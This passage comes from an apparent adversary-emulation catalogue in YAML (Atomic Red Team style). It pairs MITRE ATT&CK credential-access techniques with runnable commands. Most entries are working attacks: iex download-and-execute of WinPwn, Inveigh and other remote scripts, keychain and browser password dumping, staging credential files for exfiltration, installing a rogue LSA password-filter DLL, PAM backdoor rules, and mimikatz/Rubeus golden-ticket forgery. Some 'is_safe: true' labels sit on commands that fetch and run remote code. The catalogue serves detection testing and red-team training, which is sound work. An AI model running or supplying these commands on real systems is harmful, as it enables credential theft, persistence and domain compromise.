        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        lazagnemodule -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - Wifi Credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        wificreds -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        decryptteamviewer -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1555
  is_safe: true
- id: T1555.001
  name: Keychain
  description: "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.[1](https://developer.apple.com/documentation/security/keychain_services)[2](https://support.passware.com/hc/en-us/articles/4573379868567-A-Deep-Dive-into-Apple-Keychain-Decryption)[3](https://www.netmeister.org/blog/keychain-passwords.html)\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.[4](https://www.slideshare.net/slideshow/external-to-da-the-os-x-way/62021418)[5](https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/collection/osx/keychaindump_decrypt.py)"
  tactic: credential-access
  platforms:
    - macos
  executors:
    - name: Keychain Dump
      type: sh
      platform: macos
      command: sudo security dump-keychain -d login.keychain
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Export Certificate Item(s)
      type: sh
      platform: macos
      command: security find-certificate -a -p > /tmp/certs.pem
      cleanup: rm /tmp/certs.pem
      timeout: 60
      is_safe: true
    - name: Import Certificate Item(s) into Keychain
      type: sh
      platform: macos
      command: security import /tmp/certs.pem -k
      timeout: 60
      is_safe: true
    - name: Copy Keychain using cat utility
      type: sh
      platform: macos
      command: cat ~/Library/Keychains/login.keychain-db > /tmp/keychain
      cleanup: rm /tmp/keychain
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1555/001
  is_safe: true
- id: T1555.003
  name: Credentials from Web Browsers
  description: |-
    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.[1](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.

    For example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.[2](https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata)

    Adversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.[3](https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign)[4](https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).

    Adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.[5](https://github.com/putterpanda/mimikittenz)

    After acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Run Chrome-password Collector
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\Sysinternals\accesschk.exe" -ArgumentList "-accepteula ."
      cleanup: Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\Sysinternals" -Force -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Search macOS Safari Cookies
      type: sh
      platform: macos
      command: |-
        cd ~/Library/Cookies
        grep -q "coinbase" "Cookies.binarycookies"
      timeout: 60
      is_safe: true
    - name: LaZagne - Credentials from Browser
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1555.003\bin\LaZagne.exe" browsers'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Simulating access to Chrome Login Data
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
      cleanup: |-
        Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
        Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Simulating access to Opera Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Simulating access to Windows Firefox Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
      timeout: 120
      is_safe: true
    - name: Simulating access to Windows Edge Login Data
      type: powershell
      platform: windows
      command: Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" -Destination "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -Recurse
      cleanup: Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Edge" -Force -ErrorAction Ignore -Recurse
      timeout: 120
      is_safe: true
    - name: Decrypt Mozilla Passwords with Firepwd.py
      type: powershell
      platform: windows
      command: |-
        $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
        cmd /c PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\python.exe PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py -d $PasswordDBLocation > $env:temp\T1555.003Test8.txt
        cat $env:temp\T1555.003Test8.txt
      cleanup: Remove-Item -Path "$env:temp\T1555.003Test8.txt" -erroraction silentlycontinue
      timeout: 120
      is_safe: true
    - name: LaZagne.py - Dump Credentials from Firefox Browser
      type: sh
      platform: linux
      command: python3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt
      cleanup: rm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Stage Popular Credential Files for Exfiltration
      type: powershell
      platform: windows
      command: "$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force"
      cleanup: "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue"
      timeout: 120
      is_safe: true
    - name: WinPwn - BrowserPwn
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        browserpwn -consoleoutput -noninteractive
      cleanup: rm .\System.Data.SQLite.dll -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - mimi-kittenz
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        kittenz -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
        Invoke-Sharpweb -command "all"
      timeout: 120
      is_safe: true
    - name: Simulating Access to Chrome Login Data - MacOS
      type: sh
      platform: macos
      command: |-
        cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
        cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
      cleanup: |-
        rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
        rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
      timeout: 60
      is_safe: true
    - name: WebBrowserPassView - Credentials from Browser
      type: powershell
      platform: windows
      command: |-
        Start-Process "PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe"
        Start-Sleep -Second 4
        Stop-Process -Name "WebBrowserPassView"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: BrowserStealer (Chrome / Firefox / Microsoft Edge)
      type: powershell
      platform: windows
      command: |-
        $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
        Copy-Item $profile\key4.db -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
        Copy-Item $profile\logins.json -Destination "PathToAtomicsFolder\..\ExternalPayloads" > $null
        Remove-Item $profile\key4.db > $null
        Remove-Item $profile\logins.json > $null
        Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\key4.db" -Destination $profile\ > $null
        Copy-Item "$env:PathToAtomicsFolder\T1555.003\src\logins.json" -Destination $profile\ > $null
        cd "$env:PathToAtomicsFolder\T1555.003\bin"
        ""|.\BrowserCollector.exe
      cleanup: |-
        $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
        Remove-Item $profile\key4.db > $null
        Remove-Item $profile\logins.json > $null
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads" -Destination $profile\ > $null
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\key4.db" > $null
        Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\logins.json" > $null
      timeout: 120
      is_safe: true
    - name: Dump Chrome Login Data with esentutl
      type: cmd
      platform: windows
      command: esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "%temp%\T1555.003_Login_Data.tmp"
      cleanup: del /f /q %temp%\T1555.003_Login_Data.tmp > nul 2>&1
      timeout: 120
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1555/003
  is_safe: true
- id: T1555.004
  name: Windows Credential Manager
  description: |-
    Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).[1](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#credential-manager-store)[2](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-8.1-and-8/jj554668(v=ws.11)?redirectedfrom=MSDN)

    The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

    Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.[3](https://www.passcape.com/windows_password_recovery_vault_explorer)[4](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)

    Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.[5](https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratea)[6](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

    Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

    Password recovery tools may also obtain plain text passwords from the Credential Manager.[4](https://blog.malwarebytes.com/101/2016/01/the-windows-vaults/)
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Access Saved Credentials via VaultCmd
      type: cmd
      platform: windows
      command: vaultcmd /listcreds:"Windows Credentials"
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - Invoke-WCMDump
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
        Invoke-WCMDump
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1555/004
  is_safe: true
- id: T1556.002
  name: Password Filter DLL
  description: "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \n\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \n\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1](http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html)"
  tactic: credential-access
  tactics:
    - credential-access
    - defense-evasion
    - persistence
  platforms:
    - windows
  executors:
    - name: Install and Register Password Filter DLL
      type: powershell
      platform: windows
      command: |-
        reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
        $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
        $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
        $notificationPackagesValues += $passwordFilterName
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
      cleanup: |-
        reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Install Additional Authentication Packages
      type: powershell
      platform: windows
      command: |-
        reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
        $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
        $AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
        $AuthenticationPackagesValues += $passwordFilterName
        Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues
      cleanup: |-
        reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
        remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1556/002
  is_safe: false
- id: T1556.003
  name: Pluggable Authentication Modules
  description: |-
    Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.[1](https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt)[2](https://linux.die.net/man/8/pam_unix)[3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules)

    Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.[4](https://github.com/zephrax/linux-pam-backdoor)

    Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.[5](https://web.archive.org/web/20240303094335/https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)[1](https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt)
  tactic: credential-access
  tactics:
    - credential-access
    - defense-evasion
    - persistence
  platforms:
    - linux
    - macos
  executors:
    - name: Malicious PAM rule
      type: sh
      platform: linux
      command: sudo sed -i "1s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su-l
      cleanup: sudo sed -i "\,auth sufficient pam_succeed_if.so uid >= 0,d" /etc/pam.d/su-l
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Malicious PAM rule (freebsd)
      type: sh
      platform: linux
      command: sudo sed -i "" "8s,^,auth sufficient pam_succeed_if.so uid >= 0\n,g" /etc/pam.d/su
      cleanup: sudo sed -i "" "/auth sufficient pam_succeed_if.so uid >= 0/d" /etc/pam.d/su
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Malicious PAM module
      type: sh
      platform: linux
      command: sudo sed -i "1s,^,auth sufficient /tmp/pam_evil.so\n,g" /etc/pam.d/su-l
      cleanup: sudo sed -i "\,auth sufficient /tmp/pam_evil.so,d" /etc/pam.d/su-l
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1556/003
  is_safe: false
- id: T1557.001
  name: LLMNR/NBT-NS Poisoning and SMB Relay
  description: "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. [1](https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution)[2](https://technet.microsoft.com/library/cc958811.aspx)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[3](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)[4](https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).[5](https://github.com/nomex/nbnspoof)[6](https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response)[7](https://github.com/SpiderLabs/Responder)"
  tactic: credential-access
  tactics:
    - credential-access
    - collection
  platforms:
    - windows
  executors:
    - name: LLMNR Poisoning with Inveigh (PowerShell)
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
        Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1557/001
  is_safe: false
- id: T1558.001
  name: Golden Ticket
  description: "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.[1](https://adsecurity.org/?p=1640) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.[2](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf) \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.[3](https://adsecurity.org/?p=1515)\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.[4](https://adsecurity.org/?p=483) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller."
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Crafting Active Directory golden tickets with mimikatz
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\%userdnsdomain%\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      timeout: 120
      is_safe: true
    - name: Crafting Active Directory golden tickets with Rubeus
      type: powershell
      platform: windows
      command: "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1558/001
  is_safe: true
- id: T1558.002
  name: Silver Ticket
  description: |-
    Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.[1](https://adsecurity.org/?p=2011)

